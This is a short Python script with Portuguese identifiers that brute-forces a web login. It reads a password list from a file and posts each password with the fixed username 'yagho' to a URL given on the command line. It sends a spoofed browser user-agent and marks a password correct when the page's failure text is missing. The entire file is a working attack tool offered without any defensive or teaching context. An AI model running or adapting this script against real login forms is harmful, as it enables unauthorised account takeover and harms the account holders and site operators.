#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import sys

arquivo = open('spam.txt')

url = sys.argv[1]

urls = arquivo.readlines()

for i in urls:

	dados = {'username': 'yagho', 'password': i}

	cabecalho = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}

	resposta = requests.post(url, headers=cabecalho, data=dados)
	
	if "prosseguirmos" in resposta.text:
		print("Senha incorreta: ", i)
	elif resposta.status_code == 404:
		print("Pagina off")
	else:
		print("Senha correta: ", i)
